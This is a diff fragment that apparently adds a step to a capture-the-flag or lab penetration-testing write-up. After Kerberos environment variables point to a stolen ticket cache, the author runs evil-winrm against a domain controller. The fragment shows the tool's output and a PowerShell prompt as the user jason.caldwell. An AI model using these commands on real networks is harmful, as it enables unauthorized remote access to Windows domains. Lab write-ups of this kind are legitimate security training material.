@@ -384,3 +384,21 @@ export KRB5_CONFIG=/etc/krb5.conf
 
 export KRB5CCNAME=jason.caldwell.ccache
 ```
+
+Now all that is exported i can log in 
+
+```python
+evil-winrm -i dc.hsm-defense.local -r hsm-defense.local          
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\jason.caldwell\Documents>
+```
+
+I now have access to this account
+
